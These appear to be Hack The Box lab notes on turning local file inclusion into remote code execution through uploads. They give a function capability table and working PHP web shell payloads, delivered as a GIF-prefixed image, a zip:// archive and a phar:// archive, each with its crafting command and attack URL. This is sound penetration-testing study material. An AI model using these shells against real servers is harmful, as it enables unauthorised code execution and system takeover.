| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `include`                    |        ✅         |      ✅      |       ✅        |
## Image upload
#### Crafting Malicious Image

```shell
3kjS@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
#### Uploaded File Path

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```
![](Pasted%20image%2020260701123553.png)
## Zip Upload

```shell
3kjS@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
![](Pasted%20image%2020260701123803.png)
## Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php 
$phar = new Phar('shell.phar'); 
$phar->startBuffering(); 
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>'); 
$phar->setStub('<?php __HALT_COMPILER(); ?>'); 

$phar->stopBuffering();
```

```shell
3kjS@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
![](Pasted%20image%2020260701123924.png)
